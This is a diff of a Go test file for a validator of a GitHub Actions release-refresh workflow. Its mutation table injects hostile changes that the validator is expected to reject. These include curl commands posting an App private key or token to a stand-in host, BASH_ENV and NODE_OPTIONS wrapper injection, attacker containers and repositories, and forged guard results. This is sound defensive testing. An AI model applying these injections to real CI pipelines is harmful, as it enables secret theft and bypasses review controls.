@@ -1264,9 +1264,7 @@ func TestValidateCIWorkflowPRShapeFlowAcceptsSharedJobGate(t *testing.T) {
 	}
 }
 
-func TestValidateUpstreamRefreshWorkflowRejectsGitHubSidePRPublication(t *testing.T) {
-	t.Parallel()
-	workflow := `name: Upstream refresh
+const upstreamRefreshWorkflowFixture = `name: Upstream refresh
 
 on:
   workflow_dispatch:
@@ -1276,75 +1274,8 @@ env:
 
 jobs:
   refresh:
-    environment:
-      name: upstream-refresh
-    permissions:
-      contents: read
-      issues: write
-      pull-requests: read
-    steps:
-      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
-        with:
-          fetch-depth: 0
-          persist-credentials: false
-      - uses: sigstore/cosign-installer@cad07c2e89fa2edd6e2d7bab4c1aa38e53f76003 # v4.1.1
-        with:
-          cosign-release: ${{ env.WORKCELL_COSIGN_VERSION }}
-      - run: sudo install -m 0755 "$(command -v cosign)" /usr/local/bin/cosign
-      - env:
-          GITHUB_TOKEN: ${{ github.token }}
-        run: |
-          token_file="$(mktemp "${RUNNER_TEMP}/workcell-github-api-token.XXXXXX")"
-          (umask 077 && printf '%s' "${GITHUB_TOKEN}" >"${token_file}")
-          unset GITHUB_TOKEN GH_TOKEN
-          trap 'rm -f "${token_file}"' EXIT
-          WORKCELL_GITHUB_API_TOKEN_FILE="${token_file}" ./scripts/update-upstream-pins.sh --apply
-      - env:
-          GITHUB_TOKEN: ${{ github.token }}
-        run: |
-          token_file="$(mktemp "${RUNNER_TEMP}/workcell-github-api-token.XXXXXX")"
-          (umask 077 && printf '%s' "${GITHUB_TOKEN}" >"${token_file}")
-          unset GITHUB_TOKEN GH_TOKEN
-          trap 'rm -f "${token_file}"' EXIT
-          WORKCELL_GITHUB_API_TOKEN_FILE="${token_file}" ./scripts/update-upstream-pins.sh --check
-          ./scripts/check-pinned-inputs.sh
-      - run: |
-          jq -n '{version:1}' > metadata.json
-      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
-        with:
-          name: upstream-refresh-candidate
-          path: metadata.json
-      - env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          gh issue edit 1 --body "candidate"
-          gh pr create --draft
-`
-
-	err := metadatautil.ValidateUpstreamRefreshWorkflow(workflow)
-	if err == nil {
-		t.Fatal("metadatautil.ValidateUpstreamRefreshWorkflow() unexpectedly succeeded")
-	}
-	if !strings.Contains(err.Error(), `gh pr create`) {
-		t.Fatalf("metadatautil.ValidateUpstreamRefreshWorkflow() error = %v, want GitHub-side PR publication rejection", err)
-	}
-}
-
-func TestValidateUpstreamRefreshWorkflowAcceptsCanonicalFlow(t *testing.T) {
-	t.Parallel()
-	workflow := `name: Upstream refresh
-
-on:
-  workflow_dispatch:
-
-env:
-  WORKCELL_COSIGN_VERSION: v3.0.6
-
-jobs:
-  refresh:
+    runs-on: ubuntu-latest
     if: github.ref == 'refs/heads/main'
-    environment:
-      name: upstream-refresh
     permissions:
       contents: read
       issues: write
@@ -1385,12 +1316,133 @@ jobs:
           GH_TOKEN: ${{ github.token }}
         run: |
           gh issue create --title "Upstream refresh candidate" --body "metadata.json"
+  scope-guard:
+    runs-on: ubuntu-latest
+    needs: refresh
+    outputs:
+      result: ${{ steps.guard.outcome == 'success' && 'passed' || 'failed' }}
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
+        with:
+          name: upstream-refresh-candidate
+          path: ${{ runner.temp }}/candidate
+      - id: guard
+        shell: bash --noprofile --norc -euo pipefail {0}
+        continue-on-error: true
+        run: |
+          ./scripts/ci/upstream-refresh-scope-guard.sh "${RUNNER_TEMP}/candidate/patch"
+  publish:
+    runs-on: ubuntu-latest
+    needs: [refresh, scope-guard]
+    environment:
+      name: upstream-refresh
+    permissions:
+      contents: read
+      issues: write
+    steps:
+      - id: app-token
+        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3
+        with:
+          client-id: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}
+          private-key: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}
+          permission-contents: write
+          permission-pull-requests: write
+      - shell: bash --noprofile --norc -euo pipefail {0}
+        env:
+          GH_TOKEN: ${{ steps.app-token.outputs.token }}
+          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}
+        run: |
+          ./scripts/ci/upstream-refresh-publish.sh candidate "${SCOPE_GUARD_RESULT}" audit.md
 `
 
+func TestValidateUpstreamRefreshWorkflowAcceptsCanonicalFlow(t *testing.T) {
+	t.Parallel()
+	workflow := upstreamRefreshWorkflowFixture
 	if err := metadatautil.ValidateUpstreamRefreshWorkflow(workflow); err != nil {
 		t.Fatalf("metadatautil.ValidateUpstreamRefreshWorkflow() error = %v", err)
 	}
 	assertManualWorkflowMainRefGuard(t, workflow, metadatautil.ValidateUpstreamRefreshWorkflow)
+}
+
+func TestValidateUpstreamRefreshWorkflowRejectsMutations(t *testing.T) {
+	t.Parallel()
+	mutations := []struct {
+		name, old, replacement, want string
+	}{
+		{"refresh job PR creation", `gh issue create --title "Upstream refresh candidate" --body "metadata.json"`, "gh issue create --title x\n          gh pr create --draft", "refresh job must not contain"},
+		{"refresh job contents write", "      contents: read\n      issues: write", "      contents: write\n      issues: write", "refresh job must grant exactly"},
+		{"publish pull-requests write", "      contents: read\n      issues: write\n    steps:\n      - id: app-token", "      contents: read\n      pull-requests: write\n      issues: write\n    steps:\n      - id: app-token", "publish job must grant exactly"},
+		{"refresh job environment", "  refresh:\n", "  refresh:\n    environment:\n      name: upstream-refresh\n", "refresh job must not bind an environment"},
+		{"refresh job mints App token", "      - run: |\n          jq -n", "      - uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1\n      - run: |\n          jq -n", "must not mint the GitHub App token"},
+		{"scope-guard extra permission", "      contents: read\n    steps:\n      - uses: actions/checkout", "      contents: read\n      issues: write\n    steps:\n      - uses: actions/checkout", "scope-guard job must run the scope guard"},
+		{"scope-guard result forged", "result: ${{ steps.guard.outcome == 'success' && 'passed' || 'failed' }}", "result: passed", "must export result from the guard step outcome"},
+		{"scope-guard failure masked", "          ./scripts/ci/upstream-refresh-scope-guard.sh \"${RUNNER_TEMP}/candidate/patch\"", "          ./scripts/ci/upstream-refresh-scope-guard.sh \"${RUNNER_TEMP}/candidate/patch\" || true\n          echo result=passed >> \"${GITHUB_OUTPUT}\"", "scope-guard job must run the scope guard as its only run step"},
+		{"scope-guard shell override", "        shell: bash --noprofile --norc -euo pipefail {0}\n        continue-on-error", "        shell: sh -c 'exit 0' {0}\n        continue-on-error", "scope-guard job must run the scope guard as its only run step"},
+		{"scope-guard second run step", "      - id: guard\n", "      - run: echo 'exit 0' > ./scripts/ci/upstream-refresh-scope-guard.sh\n      - id: guard\n", "reviewed checkout, candidate download"},
+		{"scope-guard renamed step", "      - id: guard\n", "      - id: check\n", "scope-guard job must run the scope guard as its only run step"},
+		{"publish contents write", "      contents: read\n      issues: write\n    steps:\n      - id: app-token", "      contents: write\n      issues: write\n    steps:\n      - id: app-token", "publish job must grant exactly"},
+		{"publish missing environment", "    environment:\n      name: upstream-refresh\n", "", "publish job must bind the upstream-refresh environment"},
+		{"scope-guard checkout from another repository", "          persist-credentials: false\n      - uses: actions/download", "          persist-credentials: false\n          repository: evil/other\n      - uses: actions/download", "reviewed checkout, candidate download"},
+		{"refresh publishes behind a line continuation", "          gh issue create --title \"Upstream refresh candidate\"", "          gh pr \\\n            create --fill\n          gh issue create --title \"Upstream refresh candidate\"", "must not contain \"gh pr create\""},
+		{"publish missing scope-guard need", "needs: [refresh, scope-guard]", "needs: [refresh]", "publish job must need exactly"},
+		{"publish step chains another command", "candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n          gh pr merge 1\n", "must run only the publish script"},
+		{"publish step reads the private key", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - env:\n          K: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: echo\n", "App token only in the publish script step"},
+		{"publish service reads the private key", "  publish:\n    runs-on: ubuntu-latest\n", "  publish:\n    runs-on: ubuntu-latest\n    services:\n      s:\n        image: registry.example.invalid/x\n        credentials:\n          username: u\n          password: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n", "must not run in a container or services"},
+		{"publisher step gains an env", "          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}\n", "          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}\n          X: y\n", "must run only the publish script"},
+		{"presence step leaks the private key", "      - id: app-token\n", "      - id: secrets\n        env:\n          APP_CLIENT_ID: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}\n          APP_PRIVATE_KEY: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: curl -d \"${APP_PRIVATE_KEY}\" https://example.invalid\n      - id: app-token\n", "App token only in the publish script step"},
+		{"scope-guard loses continue-on-error", "        continue-on-error: true\n", "", "scope-guard job must run the scope guard as its only run step"},
+		{"scope-guard job env sets BASH_ENV", "  scope-guard:\n", "  scope-guard:\n    env:\n      BASH_ENV: ./exit0.sh\n", "not inherit workflow or job env"},
+		{"workflow env sets NODE_OPTIONS", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n  NODE_OPTIONS: --require=${{ github.workspace }}/wrapper.js\n", "not inherit workflow or job env"},
+		{"publish job env sets BASH_ENV", "    environment:\n      name: upstream-refresh\n", "    environment:\n      name: upstream-refresh\n    env:\n      BASH_ENV: ./wrapper.sh\n", "not inherit workflow or job env"},
+		{"publisher drops its shell pin", "      - shell: bash --noprofile --norc -euo pipefail {0}\n        env:", "      - env:", "must run only the publish script"},
+		{"publish replaces the script before running it", "      - shell: bash --noprofile --norc -euo pipefail {0}\n        env:", "      - run: echo x > scripts/ci/upstream-refresh-publish.sh\n      - shell: bash --noprofile --norc -euo pipefail {0}\n        env:", "must not run other steps before the publish script"},
+		{"publish step reads the whole steps context", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - env:\n          T: ${{ toJSON(STEPS) }}\n        run: echo\n", "App token only in the publish script step"},
+		{"scope-guard runs in a container", "    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout", "    container: attacker/image\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout", "must run on ubuntu-latest and must not run in a container"},
+		{"publish runs on a self-hosted runner", "  publish:\n    runs-on: ubuntu-latest\n", "  publish:\n    runs-on: self-hosted\n", "must run on ubuntu-latest"},
+		{"scope-guard step moves its working directory", "      - id: guard\n", "      - id: guard\n        working-directory: attacker\n", "scope-guard job must run the scope guard as its only run step"},
+		{"publisher moves its working directory", "        env:\n          GH_TOKEN: ${{ steps.app-token.outputs.token }}\n", "        working-directory: attacker\n        env:\n          GH_TOKEN: ${{ steps.app-token.outputs.token }}\n", "must run only the publish script"},
+		{"workflow default working directory", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n", "defaults:\n  run:\n    working-directory: attacker\nenv:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n", "not inherit workflow or job env"},
+		{"publish job defaults", "  publish:\n    runs-on: ubuntu-latest\n", "  publish:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: attacker\n", "not inherit workflow or job env"},
+		{"post-publish step sends the token from its shell", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - shell: curl -d ${{ steps.app-token.outputs.token }} https://example.invalid; bash {0}\n        run: \"true\"\n", "App token only in the publish script step"},
+		{"post-publish step puts the token in its working directory", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - working-directory: /tmp/${{ steps.app-token.outputs.token }}\n        run: echo \"${PWD}\"\n", "App token only in the publish script step"},
+		{"mint step injects NODE_OPTIONS", "      - id: app-token\n        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3\n", "      - id: app-token\n        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3\n        env:\n          NODE_OPTIONS: --require ./wrapper.js\n", "must mint the App token"},
+		{"presence step uses a wrapper shell", "      - id: app-token\n", "      - id: secrets\n        shell: ./wrap {0}\n        env:\n          APP_CLIENT_ID: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}\n          APP_PRIVATE_KEY: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: |\n          if [[ -z \"${APP_CLIENT_ID}\" || -z \"${APP_PRIVATE_KEY}\" ]]; then\n            echo \"present=false\" >> \"${GITHUB_OUTPUT}\"\n            echo \"::notice::The upstream-refresh App credentials are not configured. Publication is skipped. See docs/github-workflows.md.\"\n            exit 0\n          fi\n          echo \"present=true\" >> \"${GITHUB_OUTPUT}\"\n      - id: app-token\n", "App token only in the publish script step"},
+		{"publish hard-codes the guard result", "candidate \"${SCOPE_GUARD_RESULT}\" audit.md", "candidate passed audit.md", "second publish script argument"},
+		{"publish ignores scope-guard result", "SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}", "SCOPE_GUARD_RESULT: passed", "must pass the scope-guard result"},
+		{"publish App token extra permission", "          permission-pull-requests: write\n", "          permission-pull-requests: write\n          permission-workflows: write\n", "only contents and pull-requests write"},
+		{"publish App token renamed step", "      - id: app-token\n", "      - id: token\n", "as step app-token"},
+		{"publish with a PAT", "GH_TOKEN: ${{ steps.app-token.outputs.token }}", "GH_TOKEN: ${{ secrets.OTHER_PAT }}", "must pass the App token as GH_TOKEN"},
+		{"hosted signing input", "      - env:\n          GH_TOKEN: ${{ github.token }}\n        run: |\n          gh issue create", "      - env:\n          WORKCELL_UPSTREAM_REFRESH_GPG_PRIVATE_KEY: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_GPG_PRIVATE_KEY }}\n        run: |\n          gh issue create", "WORKCELL_UPSTREAM_REFRESH_GPG_PRIVATE_KEY"},
+	}
+	for _, mutation := range mutations {
+		t.Run(mutation.name, func(t *testing.T) {
+			old := strings.ReplaceAll(mutation.old, `\n`, "\n")
+			if !strings.Contains(upstreamRefreshWorkflowFixture, old) {
+				t.Fatalf("fixture does not contain %q", old)
+			}
+			mutated := strings.Replace(upstreamRefreshWorkflowFixture, old, strings.ReplaceAll(mutation.replacement, `\n`, "\n"), 1)
+			err := metadatautil.ValidateUpstreamRefreshWorkflow(mutated)
+			if err == nil || !strings.Contains(err.Error(), mutation.want) {
+				t.Fatalf("metadatautil.ValidateUpstreamRefreshWorkflow() error = %v, want %q", err, mutation.want)
+			}
+		})
+	}
+}
+
+// TestValidateUpstreamRefreshWorkflowRejectsEvasions runs the shared evasion
+// corpus against the publish command in the canonical workflow. A comment,
+// heredoc body or longer name must not satisfy it. The scope-guard step needs
+// no corpus run: the validator requires its exact run text.
+func TestValidateUpstreamRefreshWorkflowRejectsEvasions(t *testing.T) {
+	t.Parallel()
+	RequireRejectsAllEvasions(t, upstreamRefreshWorkflowFixture,
+		"          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md",
+		"run the publish script once", metadatautil.ValidateUpstreamRefreshWorkflow)
 }
 
 func TestValidateHostedControlsWorkflowRequiresMainRef(t *testing.T) {
@@ -1474,134 +1526,6 @@ func assertManualWorkflowMainRefGuard(t *testing.T, workflow string, validate fu
 				t.Fatalf("validator error = %v, want main-ref guard rejection", err)
 			}
 		})
-	}
-}
-
-func TestValidateUpstreamRefreshWorkflowRejectsHostedSigningInputs(t *testing.T) {
-	t.Parallel()
-	workflow := `name: Upstream refresh
-
-on:
-  workflow_dispatch:
-
-env:
-  WORKCELL_COSIGN_VERSION: v3.0.6
-
-jobs:
-  refresh:
-    environment:
-      name: upstream-refresh
-    permissions:
-      contents: read
-      issues: write
-      pull-requests: read
-    steps:
-      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
-        with:
-          fetch-depth: 0
-          persist-credentials: false
-      - uses: sigstore/cosign-installer@cad07c2e89fa2edd6e2d7bab4c1aa38e53f76003 # v4.1.1
-        with:
-          cosign-release: ${{ env.WORKCELL_COSIGN_VERSION }}
-      - run: sudo install -m 0755 "$(command -v cosign)" /usr/local/bin/cosign
-      - env:
-          GITHUB_TOKEN: ${{ github.token }}
-        run: |
-          token_file="$(mktemp "${RUNNER_TEMP}/workcell-github-api-token.XXXXXX")"
-          (umask 077 && printf '%s' "${GITHUB_TOKEN}" >"${token_file}")
-          unset GITHUB_TOKEN GH_TOKEN
-          trap 'rm -f "${token_file}"' EXIT
-          WORKCELL_GITHUB_API_TOKEN_FILE="${token_file}" ./scripts/update-upstream-pins.sh --apply
-      - env:
-          GITHUB_TOKEN: ${{ github.token }}
-        run: |
-          token_file="$(mktemp "${RUNNER_TEMP}/workcell-github-api-token.XXXXXX")"
-          (umask 077 && printf '%s' "${GITHUB_TOKEN}" >"${token_file}")
-          unset GITHUB_TOKEN GH_TOKEN
-          trap 'rm -f "${token_file}"' EXIT
-          WORKCELL_GITHUB_API_TOKEN_FILE="${token_file}" ./scripts/update-upstream-pins.sh --check
-          ./scripts/check-pinned-inputs.sh
-      - run: |
-          jq -n '{version:1}' > metadata.json
-      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
-        with:
-          name: upstream-refresh-candidate
-          path: metadata.json
-      - env:
-          WORKCELL_UPSTREAM_REFRESH_GPG_PRIVATE_KEY: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_GPG_PRIVATE_KEY }}
-        run: |
-          gh issue create --title "Upstream refresh candidate" --body "metadata.json"
-`
-
-	err := metadatautil.ValidateUpstreamRefreshWorkflow(workflow)
-	if err == nil {
-		t.Fatal("metadatautil.ValidateUpstreamRefreshWorkflow() unexpectedly succeeded")
-	}
-	if !strings.Contains(err.Error(), "WORKCELL_UPSTREAM_REFRESH_GPG_PRIVATE_KEY") {
-		t.Fatalf("metadatautil.ValidateUpstreamRefreshWorkflow() error = %v, want hosted signing input rejection", err)
-	}
-}
-
-func TestValidateUpstreamRefreshWorkflowRejectsMissingEnvironmentBinding(t *testing.T) {
-	t.Parallel()
-	workflow := `name: Upstream refresh
-
-on:
-  workflow_dispatch:
-
-env:
-  WORKCELL_COSIGN_VERSION: v3.0.6
-
-jobs:
-  refresh:
-    permissions:
-      contents: read
-      issues: write
-      pull-requests: read
-    steps:
-      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
-        with:
-          fetch-depth: 0
-          persist-credentials: false
-      - uses: sigstore/cosign-installer@cad07c2e89fa2edd6e2d7bab4c1aa38e53f76003 # v4.1.1
-        with:
-          cosign-release: ${{ env.WORKCELL_COSIGN_VERSION }}
-      - run: sudo install -m 0755 "$(command -v cosign)" /usr/local/bin/cosign
-      - env:
-          GITHUB_TOKEN: ${{ github.token }}
-        run: |
-          token_file="$(mktemp "${RUNNER_TEMP}/workcell-github-api-token.XXXXXX")"
-          (umask 077 && printf '%s' "${GITHUB_TOKEN}" >"${token_file}")
-          unset GITHUB_TOKEN GH_TOKEN
-          trap 'rm -f "${token_file}"' EXIT
-          WORKCELL_GITHUB_API_TOKEN_FILE="${token_file}" ./scripts/update-upstream-pins.sh --apply
-      - env:
-          GITHUB_TOKEN: ${{ github.token }}
-        run: |
-          token_file="$(mktemp "${RUNNER_TEMP}/workcell-github-api-token.XXXXXX")"
-          (umask 077 && printf '%s' "${GITHUB_TOKEN}" >"${token_file}")
-          unset GITHUB_TOKEN GH_TOKEN
-          trap 'rm -f "${token_file}"' EXIT
-          WORKCELL_GITHUB_API_TOKEN_FILE="${token_file}" ./scripts/update-upstream-pins.sh --check
-          ./scripts/check-pinned-inputs.sh
-      - run: |
-          jq -n '{version:1}' > metadata.json
-      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
-        with:
-          name: upstream-refresh-candidate
-          path: metadata.json
-      - env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          gh issue create --title "Upstream refresh candidate" --body "metadata.json"
-`
-
-	err := metadatautil.ValidateUpstreamRefreshWorkflow(workflow)
-	if err == nil {
-		t.Fatal("metadatautil.ValidateUpstreamRefreshWorkflow() unexpectedly succeeded")
-	}
-	if !strings.Contains(err.Error(), `environment:\n      name: upstream-refresh`) {
-		t.Fatalf("metadatautil.ValidateUpstreamRefreshWorkflow() error = %v, want upstream-refresh environment binding rejection", err)
 	}
 }
 
@@ -1907,6 +1831,7 @@ func TestValidateCanonicalHostedControlsWorkflowEnvironmentsRejectsMissingHosted
 				"deployment_branches": []any{"main"},
 			},
 			"upstream-refresh": map[string]any{
+				"required_secrets":    []any{"WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID", "WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY"},
 				"allow_admin_bypass":  false,
 				"deployment_branches": []any{"main"},
 			},
@@ -1988,6 +1913,7 @@ func TestValidateCanonicalHostedControlsWorkflowEnvironmentsRejectsInvalidReleas
 						"deployment_tags":     []any{"v*"},
 					},
 					"upstream-refresh": map[string]any{
+						"required_secrets":    []any{"WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID", "WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY"},
 						"allow_admin_bypass":  false,
 						"deployment_branches": []any{"main"},
 					},
@@ -2020,7 +1946,7 @@ func TestValidateCanonicalHostedControlsWorkflowEnvironmentsRejectsUnexpectedUps
 				"deployment_tags":     []any{"v*"},
 			},
 			"upstream-refresh": map[string]any{
-				"required_secrets":    []any{"WORKCELL_UPSTREAM_REFRESH_GPG_PRIVATE_KEY"},
+				"required_secrets":    []any{"WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID", "WORKCELL_UPSTREAM_REFRESH_GPG_PRIVATE_KEY"},
 				"allow_admin_bypass":  false,
 				"deployment_branches": []any{"main"},
 			},
